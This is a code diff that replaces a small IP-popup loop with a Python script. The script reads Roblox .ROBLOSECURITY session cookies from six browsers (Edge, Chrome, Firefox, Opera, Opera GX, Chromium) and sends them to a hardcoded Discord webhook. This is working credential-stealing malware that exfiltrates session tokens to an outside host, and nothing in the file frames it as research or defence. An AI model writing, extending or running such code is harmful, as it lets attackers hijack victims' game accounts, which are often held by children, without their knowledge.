@@ -1,7 +1,79 @@
-import socket
+import discord_webhook
+import discord
+import requests
+import browser_cookie3
+from discord_webhook import DiscordWebhook
 import os
-hostname = socket.gethostname()
-IPAddr = socket.gethostbyname(hostname)
+import time
 
-while True:
-  os.system(f"msg * {IPAddr}")
+
+cooks=[]
+
+def edge_logger():
+    try:
+        rcookies = browser_cookie3.edge(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(rcookie)
+        return rcookie
+    except Exception as e:
+        return None
+def chrome_logger():
+    try:
+        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(rcookie)
+        return rcookie
+    except Exception as e:
+        return None
+def firefox_logger():
+    try:
+        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(rcookie)
+        return rcookie
+    except Exception as e:
+        return None
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(cookie)
+        return cookie
+    except Exception as e:
+        return None  
+def operagx_logger():
+    try:
+        rcookies = browser_cookie3.opera_gx(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(rcookie)
+        return rcookie
+    except Exception as e:
+        return None
+def chromium_logger():
+    try:
+        rcookies = browser_cookie3.chromium(domain_name='roblox.com')
+        rcookies = str(rcookies)
+        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        cooks.append(rcookie)
+        return rcookie
+    except Exception as e:
+        return None    
+
+roblochrome,robloedge,roblofire,robloopera,roblogx,roblochromium=chrome_logger(),edge_logger(),firefox_logger(),opera_logger(),operagx_logger(),chromium_logger()
+
+cookstr=' '.join(str(e) for e in cooks)
+cook1, cook2= cookstr.split()
+
+
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1246247840255180871/9ooRaWVIv9_e2-fLutC1CtYSX-KnUH__LvKDFWq62SbatP8ulMGyIJ5VArRNCaVbF8ik", content="New log ezz")
+webhook1 = DiscordWebhook(url="https://discord.com/api/webhooks/1246247840255180871/9ooRaWVIv9_e2-fLutC1CtYSX-KnUH__LvKDFWq62SbatP8ulMGyIJ5VArRNCaVbF8ik", content=cook2)
+webhook2 = DiscordWebhook(url="https://discord.com/api/webhooks/1246247840255180871/9ooRaWVIv9_e2-fLutC1CtYSX-KnUH__LvKDFWq62SbatP8ulMGyIJ5VArRNCaVbF8ik", content=cook1)
+
+response = webhook.execute()
+response = webhook1.execute()
+response = webhook2.execute()
